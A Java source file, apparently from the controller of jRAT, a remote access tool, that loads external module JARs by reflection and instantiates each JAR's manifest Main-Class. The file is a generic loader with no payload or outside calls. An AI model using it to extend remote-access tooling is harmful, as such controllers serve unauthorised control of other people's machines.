package jrat.controller.modules;

import jrat.api.ControllerModule;

import java.io.File;
import java.io.FileInputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.jar.JarInputStream;
import java.util.jar.Manifest;

public class LocalModule<T> extends BaseModuleLoader {

    private T instance;

    public LocalModule(File file) {
       super(file);
    }

    /**
     * Add the external JAR to classpath and create a new instance
     * of the class specified in the manifest
     * @throws Exception
     */
    public void load() throws Exception {
        JarInputStream jis = new JarInputStream(new FileInputStream(super.file));
        Manifest mf = jis.getManifest();
        String mainClass = mf.getMainAttributes().getValue("Main-Class");
        jis.close();

        // add module JAR to classpath
        Method method = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
        method.setAccessible(true);
        method.invoke(ClassLoader.getSystemClassLoader(), super.file.toURI().toURL());

        // invoke init() on module
        Class<ControllerModule> clazz = (Class<ControllerModule>) ModuleLoader.class.getClassLoader().loadClass(mainClass);
        Constructor<?> ctor = clazz.getDeclaredConstructor();
        ctor.setAccessible(true);
        T module = (T) ctor.newInstance();

        this.instance = module;
    }

    public T getInstance() {
        return instance;
    }
}
